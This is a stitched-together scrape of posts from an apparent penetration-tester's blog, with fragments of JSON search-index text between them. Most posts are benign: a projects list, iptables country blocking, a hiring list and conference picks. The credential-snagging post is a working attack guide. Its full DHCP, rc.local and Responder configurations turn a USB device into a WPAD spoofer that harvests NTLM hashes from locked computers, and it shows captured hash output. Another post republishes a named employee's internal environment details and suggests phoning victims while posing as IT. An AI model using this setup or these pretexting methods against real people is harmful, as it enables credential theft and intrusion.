https://gist.github.com/AArnott/8b39bd70630302f5c630 has been deleted - w00tw00t!! (To Microsoft, I’m fully willing to transfer the domain or null route it until it expires, whichever you prefer) WE INTERRUPT THIS BLOG POST TO TALK ABOUT THE SERIOUS OSINT TREASURE THESE TYPES FILES AND ENVIRONMENTAL VARIABLES ARE We will break down a few of the pieces that provide OSINT value: COMPUTERNAME = ANDARNO-X1 USERDNSDOMAIN = REDMOND.CORP.MICROSOFT.COM USERDOMAIN = REDMOND USERDOMAIN_ROAMINGPROFILE = REDMOND USERNAME = andarno Full domain name, user and computer name help to identify what the naming schemes are internally. ChocolateyInstall = C:\\ProgramData\\chocolatey Chocolatey is in use and possible allowed in the domain. This tool has a few persistence options, and local privilege escalation paths. SSH_AGENT_PID = 9316 SSH_AUTH_SOCK = /tmp/ssh-rbPyaDrkXVLz/agent.10020 Honestly I’ve never seen these options on a Windows box so I’m going to assume they are the result of Cygwin being installed and running with valid keys being in use. Again, another tool that provides possibilities for persistence beyond the standard Run keys. Path = C:\\Users\\andarno\\git\\VSIXSuppression\\packages\\Nerdbank.GitVersioning.1.1.2-rc\\build\\NativeBinaries/amd64 C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow C:\\Program Files (x86)\\Microsoft SDKs\\TypeScript\\1.5 C:\\Program Files (x86)\\MSBuild\\14.0\\bin C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\Common7\\IDE\\ C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\VC\\BIN C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\Common7\\Tools;C:\\WINDOWS\\Microsoft.NET\\Framework\\v4.0.30319 C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\VC\\VCPackages C:\\Program Files (x86)\\HTML Help Workshop C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\Team Tools\\Performance Tools C:\\Program Files (x86)\\Windows Kits\\10\\bin\\x86 C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.6 Tools\\ C:\\Users\\andarno\\tools\\ConEmuPack C:\\Users\\andarno\\tools\\ConEmuPack\\ConEmu C:\\WINDOWS\\system32 C:\\WINDOWS C:\\WINDOWS\\System32\\Wbem C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\ C:\\Program Files (x86)\\Git\\cmd C:\\WINDOWS\\system32\\config\\systemprofile\\.dnx\\bin C:\\Program Files\\Microsoft DNX\\Dnvm\\ C:\\Program Files\\Microsoft SQL Server\\120\\Tools\\Binn\\ C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\ C:\\Program Files (x86)\\nodejs\\ C:\\Users\\andarno\\.dnx\\runtimes\\dnx-clr-win-x86.1.0.0-beta7-12328\\bin C:\\Users\\andarno\\.dnx\\bin c:\\users\\andarno\\tools C:\\Users\\andarno\\AppData\\Local\\Code\\bin C:\\ProgramData\\chocolatey\\bin C:\\Users\\andarno\\AppData\\Roaming\\npm Anyone who has ever done DLL hijacking / preloading will see a lot of opportunities in a PATH variable this gigantic. There is a lot more fun to be had in similar output pasted across the Internet but lets get back to our regularly scheduled blog post. Here is the juice: LOGONSERVER = \\\\CO1-RED-DC-11 This probably means that 01, 02, and so on exist as well, but I decided just to go with a simple PoC and use the DC that I knew existed. After registering c01-red-dc-11.com, almost immediately I started to get DNS requests: ns1.co1-red-dc-11.com wap.co1-red-dc-11.com www.co1-red-dc-11.com mail.co1-red-dc-11.com m.co1-red-dc-11.com co1-red-dc-11.com The ns1 and www were mostly just Internet scanners, but I did see a bunch of interesting requests mail.co1-red-dc-11.com 101 total queries in the first 24 hours 27 unique servers querying Query types: A/AAAA/ANY/CNAME/MX/NS/SOA/TXT m.co1-red-dc-11.com 1 total query in the first 24 hours 1 unique servers querying Query types: A co1-red-dc-11.com 1841 total queries in the first 24 hours 777 unique servers querying Query types: A/A6/AAAA/ANY/CNAME/DNSKEY/HINFO/MX/NAPTR/NS/PTR/SOA/SPF/SRV/TXT I have no idea if any of these DNS requests were by real Microsoft domain joined systems but looking at the cont","date":"2016-12-29","objectID":"https://malicious.link/posts/2016/buying-internal-domain-access/:0:1","tags":["dns"],"title":"Buying Internal Domain Access","uri":"https://malicious.link/posts/2016/buying-internal-domain-access/"},{"categories":null,"content":"Analysis I did this with a few other %LOGONSERVER%s and had similar DNS requests. I didn’t see many packets coming in over SMB/445 because most places where a user would be away from their domain block 445 outbound. I tested out obtaining code execution in my LAB domain SITTINGDUCK.INFO and actually had to set up a VPN to a VPS just so that my lab victim could make 445 requests to the Internet. In my lab I was able to get authentication requests and code execution by using Impacket’s karmaSMB.py to send my victim a false Logon.bat very similar to the setup for MS15-011. Let me reiterate something: I DID NOT ATTEMPT ANYTHING MORE THAN LOGGING AGAINST ANY OF THE DOMAINS I REGISTERED FOR THIS RESEARCH Is this conclusive proof? Certainly not, but it’s a start and I’m interested in what ya’ll find. Why might this work more than it has in the past? Because the only scenario where this is effective is when a Windows domain-joined machine has logged in to their real domain, and without logging out or shutting down (hibernate, or sleep are fine), is then connected to a network that allows 445 outbound. This is definitely becoming more commonplace as Windows becomes more friendly to actually successfully coming back from sleeping or hibernating (yes I’m bitter ;), it was actually my primary reason for buying a Mac). How can you find the LOGONSERVER of your client? Well, it’s pretty easy to call someone up, pretend to be IT, and simply ask them what Domain Controller they are connected to ;-). Or.. if you are lucky you can find it pasted somewhere online. ","date":"2016-12-29","objectID":"https://malicious.link/posts/2016/buying-internal-domain-access/:1:0","tags":["dns"],"title":"Buying Internal Domain Access","uri":"https://malicious.link/posts/2016/buying-internal-domain-access/"},{"categories":null,"content":"One More Thing… I also tried to think in generalities, and yes, I am the proud owner of DC01.com which gets about 20 requests per second… ::evil laugh:: ","date":"2016-12-29","objectID":"https://malicious.link/posts/2016/buying-internal-domain-access/:2:0","tags":["dns"],"title":"Buying Internal Domain Access","uri":"https://malicious.link/posts/2016/buying-internal-domain-access/"},{"categories":null,"content":"Instead of making yet another post about how to start in information security I have put together a collection of all the ones that people have done before. Right now this is a raw list, but I will go through and read each one. Once that is done, I’ll supply a review of each of them in this list. Want to add to this list? Make a comment on the GIST post here: https://gist.github.com/mubix/5737a066c8845d25721ec4bf3139fd31 Another Git repository: https://github.com/gradiuscypher/infosec_getting_started/blob/master/how_to_start/README.md ","date":"2016-12-28","objectID":"https://malicious.link/start/:0:0","tags":null,"title":"Start in Infosec","uri":"https://malicious.link/start/"},{"categories":null,"content":"The following is a list of projects that I have started on Github, a description of each and links to the blog posts, source code and binaries where applicable. ","date":"2016-12-27","objectID":"https://malicious.link/projects/:0:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Attacker Knowledge Base ","date":"2016-12-27","objectID":"https://malicious.link/projects/:1:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Description Attacker Knowledge Base is a personal public wiki. I try to commit to it whenever I figure something new out or want to replicate something. You can usually find things on here before I have a fully formed. ","date":"2016-12-27","objectID":"https://malicious.link/projects/:1:1","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Site https://attackerkb.com ","date":"2016-12-27","objectID":"https://malicious.link/projects/:1:2","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Source https://github.com/mubix/akb ","date":"2016-12-27","objectID":"https://malicious.link/projects/:1:3","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Common Findings Database ","date":"2016-12-27","objectID":"https://malicious.link/projects/:2:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Description Last updated: 05/26/2016 A public copy of findings for the community. The hope is that by writing them up publicly a peer review would happen to any findings submitted and others from the community would contribute. ","date":"2016-12-27","objectID":"https://malicious.link/projects/:2:1","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Site https://cfdb.io/ ","date":"2016-12-27","objectID":"https://malicious.link/projects/:2:2","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Source https://github.com/mubix/cfdb ","date":"2016-12-27","objectID":"https://malicious.link/projects/:2:3","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"ntlmv1des ","date":"2016-12-27","objectID":"https://malicious.link/projects/:3:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"WhiteChapel-NG ","date":"2016-12-27","objectID":"https://malicious.link/projects/:4:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Shellshocker PoCs ","date":"2016-12-27","objectID":"https://malicious.link/projects/:5:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"WhiteChapel ","date":"2016-12-27","objectID":"https://malicious.link/projects/:6:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"vtnotify ","date":"2016-12-27","objectID":"https://malicious.link/projects/:7:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"NetView ","date":"2016-12-27","objectID":"https://malicious.link/projects/:8:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Ditto ","date":"2016-12-27","objectID":"https://malicious.link/projects/:9:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Description Last updated: 08/30/2015 Ditto is a binary that steals the icon and information resources of a specified binary and it writes it onto a target binary. ","date":"2016-12-27","objectID":"https://malicious.link/projects/:9:1","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Blog Post ","date":"2016-12-27","objectID":"https://malicious.link/projects/:9:2","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Release https://room362.com/projects/ditto_noicon.exe https://room362.com/projects/ditto_withicon.exe ","date":"2016-12-27","objectID":"https://malicious.link/projects/:9:3","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Source https://github.com/mubix/ditto ","date":"2016-12-27","objectID":"https://malicious.link/projects/:9:4","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Portals ","date":"2016-12-27","objectID":"https://malicious.link/projects/:10:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Power Exploitation Wiki ","date":"2016-12-27","objectID":"https://malicious.link/projects/:11:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Metasploit Wiki ","date":"2016-12-27","objectID":"https://malicious.link/projects/:12:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Meterpy ","date":"2016-12-27","objectID":"https://malicious.link/projects/:13:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"TwitterFriendsOPML ","date":"2016-12-27","objectID":"https://malicious.link/projects/:14:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"DeepMagic ","date":"2016-12-27","objectID":"https://malicious.link/projects/:15:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Watchmen ","date":"2016-12-27","objectID":"https://malicious.link/projects/:16:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"resolvequick ","date":"2016-12-27","objectID":"https://malicious.link/projects/:17:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"DeleteThatTweet ","date":"2016-12-27","objectID":"https://malicious.link/projects/:18:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"disappeared ","date":"2016-12-27","objectID":"https://malicious.link/projects/:19:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"FakeNetBIOS ","date":"2016-12-27","objectID":"https://malicious.link/projects/:20:0","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Description This is a copy of the FakeNetBIOS code that originally was written by Patrick Chambet but seemed to disappear from the Internet. I used this tool on pentests and wanted it preserved so I posted it on Github. What does it do? Well it responds to NetBIOS requests just like Responder does but on a Windows host. There is now a great powershell script that does this as well called Inveigh by Kevin Robertson . These binaries should still work if powershell isn’t available. ","date":"2016-12-27","objectID":"https://malicious.link/projects/:20:1","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Release https://github.com/mubix/FakeNetBIOS/tree/master/Win32 ","date":"2016-12-27","objectID":"https://malicious.link/projects/:20:2","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Source https://github.com/mubix/FakeNetBIOS ","date":"2016-12-27","objectID":"https://malicious.link/projects/:20:3","tags":null,"title":"Projects","uri":"https://malicious.link/projects/"},{"categories":null,"content":"Ever have one of those topics that you know you’ve looked up 100 times but never can remember the answer? I was having one of those moments in a recent conversation on the NoVA Hackers mailing list (If you want to join please read the instructions before requesting to join) The question came up as to what effect “Password Required: No” means in a net user UserName is. As usual, MSDN isn’t very helpful: /passwordreq:{yes | no} - Specifies whether a user account must have a password. The default is yes. from: https://technet.microsoft.com/en-us/library/cc771865%28v=ws.11%29.aspx An old ISS finding wasn’t any more helpful: A User account has been detected with no password required. No password requirement allows attackers unauthorized access, including the ability to take over and replace processes, and access other computers on the network. from: http://www.iss.net/security_center/reference/vulntemp/nt-usernopw.htm But they did at least provide mitigations and remediation steps. Finally doing tests on a number of different scenarios I finally figured out what it meant in more concret terms: If the passwordreq field is set on an account, the password CAN be blank which essentially bypasses any password complexity requirements: In one specific case this actually makes things more secure: CIFS/SMB does not allow access to shares or IFS actions by default as per default computer/group policy. However, RDP, WinRM, and WMI work just fine. ","date":"2016-12-07","objectID":"https://malicious.link/posts/2016/passwordreq-no-a-hacker-prospective/:0:0","tags":["passwordreq","net user","windows"],"title":"Passwordreq No - A hacker prospective","uri":"https://malicious.link/posts/2016/passwordreq-no-a-hacker-prospective/"},{"categories":null,"content":"With all of the scanning / noise on the Internet, it’s nice to get rid of a large chunk of it simply by blocking an entire country’s worth of IP space. To do that you can simply use a kernel module for iptables called “xtables-addons”. On Debian/Ubuntu it’s pretty easy to get going, just apt-get install the needed perl library and the addons themselves: apt-get install libtext-csv-xs-perl xtables-addons-common !Warning: This does require proper linux headers to be available to compile the kernel module. In the case of where these aren’t availabe (like Linode’s special kernel), you will need to find another way to get the correct headers installed. Then download the Maxmind geo database, the location of the xt_geoip_dl tool that does this is dependent on the installed version of xtables-addons. For my testing I have found it in /usr/src/xtables-addons-2.6/geoip/ as well as /usr/lib/xtables-addons/ YMMV. cd /usr/src/xtables-addons-2.6/geoip/ ./xt_geoip_dl You should see it downloading the IP databases: --2016-10-28 13:55:24-- http://geolite.maxmind.com/download/geoip/database/GeoIPv6.csv.gz Length: 1303811 (1.2M) [application/octet-stream] Saving to: ‘GeoIPv6.csv.gz’ GeoIPv6.csv.gz 100%[=========================================================================================================\u003e] 1.24M --.-KB/s in 0.004s 2016-10-28 13:55:24 (321 MB/s) - ‘GeoIPv6.csv.gz’ saved [1303811/1303811] --2016-10-28 13:55:24-- http://geolite.maxmind.com/download/geoip/database/GeoIPCountryCSV.zip Saving to: ‘GeoIPCountryCSV.zip’ GeoIPCountryCSV.zip 100%[=========================================================================================================\u003e] 2.04M --.-KB/s in 0.006s 2016-10-28 13:55:24 (326 MB/s) - ‘GeoIPCountryCSV.zip’ saved [2137625/2137625] FINISHED --2016-10-28 13:55:24-- Total wall clock time: 0.1s Downloaded: 2 files, 3.3M in 0.01s (324 MB/s) Archive: GeoIPCountryCSV.zip inflating: GeoIPCountryWhois.csv After that, you need to “build” the lists by performing the following command in that same directory (one install didn’t automatically make the directory so ensure it’s there with the mkdir command): mkdir -p /usr/share/xt_geoip ./xt_geoip_build -D /usr/share/xt_geoip *.csv After that you are off the the races and you can simply use the geoip module as so now: iptables -A INPUT -m geoip --src-cc CN -j DROP iptables -A INPUT -m geoip --src-cc HK -j DROP iptables -A INPUT -m geoip --src-cc RU -j DROP iptables -A INPUT -m geoip --src-cc KR -j DROP Or you can go the other route and just allow from your country: iptables -A INPUT -m geoip --src-cc PL -m tcp -p tcp --dport 22 -j ACCEPT When looking up how to do this many people recommended updating the GeoIP database once a month. To do this I made a really simple bash script that just repeats all the things I did and added it to a monthly cron job: File: 0update_maxmind #!/bin/bash rm -f /usr/src/xtables-addons-2.6/geoip/*.csv rm -rf /usr/share/xt_geoip/* cd /usr/src/xtables-addons-2.6/geoip/ ./xt_geoip_dl ./xt_geoip_build -D /usr/share/xt_geoip *.csv Setting the cronjob: chmod +x 0update_maxmind mv 0update_maxmind /etc/cront.monthly/ References I found useful: http://xtables-addons.sourceforge.net/geoip.php https://www.internetstaff.com/frustrate-ssh-scanners-geoip-iptables-blocking/ https://www.linode.com/stackscripts/view/3807-jeffkyjin-ipp2p+filtering ","date":"2016-10-28","objectID":"https://malicious.link/posts/2016/blocking-countries-via-iptables/:0:0","tags":["iptables","xtables","firewall"],"title":"Blocking countries via iptables","uri":"https://malicious.link/posts/2016/blocking-countries-via-iptables/"},{"categories":null,"content":"First off, this is dead simple and shouldn’t work, but it does. Also, there is no possible way that I’m the first one that has identified this, but here it is (trust me, I tested it so many ways to confirm it because I couldn’t believe it was true) TL;DR USB Ethernet + DHCP + Responder == Creds Thesis: If I plug in a device that masquerades as a USB Ethernet adapter and has a computer on the other end, can I capture credentials from a system, even when locked out (yes, logged in, just locked). (..or do even more, but we’ll save that for another time, this post is already too long) ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:0:0","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"Device Setup I started off with a USB Armory ($155) but below I’ll show you how to do this with a Hak5 Turtle ($49.99) as well. I’ll leave the setting up of the base device itself to you, but here are some links that can start you on your way: ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:1:0","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"USB Armory Debian/Jessie - https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card Kali on USB Armory - http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory Resizing the SD partition - http://base16.io/?p=61 ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:1:1","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"Hak5 Turtle Turtle video guides and wiki: https://lanturtle.com/wiki/#!videos.md ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:1:2","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"Tools Basically the capturing is done with Laurent Gaffié’s Responder so you need to find a way to get Responder onto the device. The Hak5 Turtle already has a module for it: You do have to “Enable” the module for the first time (plugged into Internet access) to get it to actually download all of dependencies and package itself. Then you also need to do a opkg update and opkg install python-openssl so that Responder will run correctly. This is only a temporary issue as the module is being fixed to include this step. As for the USB Armory is you can either use SCP, Internet Connection Sharing, the USB host/client adapter: The default install of Debian/Jessie doesn’t have Python installed so you will have to work through all of the dependencies (on the Kali version this is not needed) and will require Internet access to perform: apt-get install -y python git python-pip python-dev screen sqlite3 pip install pycrypto git clone https://github.com/spiderlabs/responder ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:2:0","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"Configuration ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:3:0","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"Armory First, setting up the interface isn’t needed but it will help with consistence since each image for the Armory come with different default IP addresses and it’s good to set a solid base. /etc/network/interfaces # interfaces(5) file used by ifup(8) and ifdown(8) # Include files from /etc/network/interfaces.d: source-directory /etc/network/interfaces.d auto usb0 allow-hotplug usb0 iface usb0 inet static address 192.168.2.201 netmask 255.255.255.0 gateway 192.168.2.1 Next we set up the DHCP server: /etc/dhcp/dhcpd.conf ddns-update-style none; option domain-name \"domain.local\"; option domain-name-servers 192.168.2.201; default-lease-time 60; max-lease-time 72; # If this DHCP server is the official DHCP server for the local # network, the authoritative directive should be uncommented. authoritative; # Use this to send dhcp log messages to a different log file (you also # have to hack syslog.conf to complete the redirection). log-facility local7; # wpad option local-proxy-config code 252 = text; # A slightly different configuration for an internal subnet. subnet 192.168.2.0 netmask 255.255.255.0 { range 192.168.2.1 192.168.2.2; option routers 192.168.2.201; option local-proxy-config \"http://192.168.2.201/wpad.dat\"; } The only special configuration here is to send the “Proxy Config” option to any DHCP clients. Why this is even a thing I have no idea, but note this line: “DHCP has a higher priority than DNS: if DHCP provides the WPAD URL, no DNS lookup is performed.” from the Wikipedia article on WPAD Next we set up things to automatically run. We edit the rc.local file so that it does a few things: Clears out all DHCP leases and start the DHCP server. There is probably a more elegant way to do this, but because this “computer” is being plugged in and taken out pretty frequently, we could run into a max in leases but most likely the file will get corrupted at some point so we just remove and re-add it. Start Responder in a screen session. This way we can get logging going on the screen session as a sort of backup for the Sqlite3 database and log files that Responder creates. /etc/rc.local #!/bin/sh -e # Clear leases rm -f /var/lib/dhcp/dhcpd.leases touch /var/lib/dhcp/dhcpd.leases # Start DHCP server /usr/sbin/dhcpd # Start Responder /usr/bin/screen -dmS responder bash -c 'cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F' exit 0 To enable logging of the screen sessions (which also gives you insight into if anything went wrong), you add a .screenrc file. There is a lot more that I put in these, mostly for aesthetics but the important pieces are these: /root/.screenrc # Logging deflog on logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log That’s it, you should be able to reboot your USB Armory and start picking up creds anywhere you can stick a USB in. ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:3:1","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"Hak5 Turtle Everything is pretty much already done for you, the only difference is that opkg is your package manager: opkg update opkg install python-openssl screen Remove the symlink to /tmp/ so that the logs will stick around rm -rf /overlay/etc/turtle/Responder/logs And the /overlay/etc/rc.local file is slightly different /overlay/etc/rc.local /etc/init.d/dnsmasq stop /usr/sbin/screen -dmS responder bash -c 'cd /overlay/etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F' Why does this work? Because USB is Plug-and-Play. This means that even if a system is locked out, the device still gets installed. Now, I believe there are restrictions on what types of devices are allowed to install at a locked out state on newer operating systems (Win10/El Capitan), but Ethernet/LAN is definitely on the white list. Computers are constantly creating traffic, even if you don’t have any browsers or applications open, and most computers trust their local network for some reason (I know the technical bits on ‘why’, just complaining…) Network preference when there are more than gateway or network connection is based on “metrics” on Windows and a combination of metrics and “preference” on OSX, but by default “wired” and “newer/faster” always win out. This means that by plugging in the device it quickly becomes the gateway, DNS server, WPAD server and others thanks to Responder. The average time for freshly inserted into a locked workstation and by the time I have creds is about 13 seconds, all depends on the system. Some addition setup I used inotify to watch for a file change in the Responder.db database and shutdown the Armory. This helps finalize file writes as well and giving me an indicator via the LED that creds were obtained. To do that you need to install the inotify-tools package and add the following to the rc.local file: echo \"Staring cred watch\" \u003e\u003e /root/rc.log /usr/bin/screen -dmS notify bash -c 'while inotifywait -e modify /root/responder/Responder.db; do shutdown -h now; done' End Result: What you see in the video is the Windows 10 lock screen (Full screened fresh install VM). When the LED goes solid white the Armory has fully shutdown because of the watch script, creds achieved!. Bring it back home and look at the results: root@wpad:~# sqlite3 /root/responder/Responder.db 'select * from responder' 2016-09-04 10:59:43|HTTP|NTLMv2|192.168.2.1||SITTINGDUCK\\mubix||5EAEA2859C397D8AE48CA87F:01010000000001E9D23F49F7891F38965D80A0010000000000000000000000000000000900260048005400540050002F007800780066006600730062006E0070006300000000000000.... Sweet!! Game over! Tested on: Windows 98 SE Windows 2000 SP4 Windows XP SP3 Windows 7 SP1 Windows 10 (Enterprise and Home) OSX El Capitan / Mavericks (I was able to get creds on both of these but I’m still testing to see if it was a fluke, or my own configurations) I still have not tested on Linux, I will make a new post on if that works. Please leave comments below if you see things I can improve upon, or errors. ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:3:2","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"USB Armory vs Hak5 LAN Turtle The Armory is more versitile with APT package to do more fun, definitely a great way to dev the attack. More storage (SD based) and slightly faster processor Hak5 LAN Turtle is MUCH easier to pass off when you are trying to plug in a device during an SE attack. It might not have the LED that the Armory does for determining when creds are achieved, but it has the added functionality of a working ethernet port, so you could get creds AND a shell. Definitely worth the extra hassel to get it working right. ","date":"2016-09-06","objectID":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/:3:3","tags":["hak5","hak5 turtle","dhcp","responder","usb armory"],"title":"Snagging creds from locked machines","uri":"https://malicious.link/posts/2016/snagging-creds-from-locked-machines/"},{"categories":null,"content":"Created the 2016 UNOFFICIAL DerbyCon Hiring List. To get on the list is even easier now! Just complete the following form: https://goo.gl/forms/LW5b1xo4O9D8eVZU2 (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to Google Doc: https://docs.google.com/spreadsheets/d/1qlJYhdxljG4f1vHhj5-Vyj5wiRb3YBjQJU4Cqh2cT6k/edit?usp=sharing ","date":"2016-08-17","objectID":"https://malicious.link/posts/2016/2016-derbycon-hiring-list/:0:0","tags":["derbycon","hiring"],"title":"2016 DerbyCon Hiring List","uri":"https://malicious.link/posts/2016/2016-derbycon-hiring-list/"},{"categories":null,"content":"Each year I make up a list the week before Blackhat and Def Con of talks that I “can’t miss” and some that I want to see (and use it for video watching afterwards for those I missed). This year I thought I would share that list here. I will be breaking them down by each day of the events by time slot. Any talk I have a :star2: by, is a “Must see” for me. If you are a blogger as well, I’d love to see other people’s picks. Drop me a link in the comments below or on Facebook/Twitter BSidesLV ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:0:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"Aug 2 - Tuesday Unfortunately I’ll have to miss these due to teaching, but these are the ones I would go to if I could. 11:45 Are you a PenTexter? Open source pentest reporting and automation Any time someone releases a tool that makes reporting easier, I’m in 4:00 Ingress Egress Ingress (AND POKEMON GO) players should attend this. ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:1:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"Aug 3 - Wednesday 10:00 Crafting tailored wordlists with Wordsmith Better wordlists are always a plus. Wonder how they factor in companies with multiple offices in multiple states. Could be awesome if you could just input a list of addresses. We’ll see… 2:00 🌟 Six Degrees of Domain Admin - Using “BloodHound” to automate Active Directory domain privilege escalation analysis Graph theory applied to derivative admin, what’s not to love? 2:30 Latest evasion techniques in fileless malware Fileless malware techniques plus new ones 3:00 Is that a penguin in my Windows? A bunch of talks on Linux on Windows at BlackHat, but I bet Spencer’s at BSidesLV will be the one to see. 6:00 One compromise to rule them all EmPyre module releases that target ZooKeeper, Marathon, Chronos, Mesos, Docker, and HAProxy BlackHat ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:2:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"Aug 3 - Wednesday 10:20 - 11:10 🌟 HTTP/2 \u0026 QUIC - Teaching good protocols to do bad things I’ll be honest, I’ll definitely be attending this one because Vyrus talks and releases cool stuff The Linux kernel hidden inside Windows 10 This is another one, Ionescu literally wrote the book(s) on Windows Internals 11:30 - 12:20 A journey from JNDI/LDAP manipulation to remote code execution dream land If I can get RCE from JNDI/LDAP I’m in, hopefully this isn’t just a review of CVE-2015-4902 1:50 - 2:40 🌟 Certificate Bypass: Hiding and executing malware from a digitally signed executable Putting evil stuff in signed binaries without making the certificate check fail. Sweeeeet! Hope they release a tool or at least go into enough detail to make one. 3:00 - 3:50 Pwning your java messaging with deserialization vulnerabilities Deserialization is the new(ish) hotness, I want to learn more about it. Recover a RSA private key from a TLS session with perfect forward secrecy Wondering if it’s another “in these perfect conditions” SSL talk, or it’s the real deal, what swayed me on this one was the tool release. 4:20 - 5:10 Account jumping, Post Infection Persistency and Lateral movement in AWS I have only been a user of AWS, not seen access on any 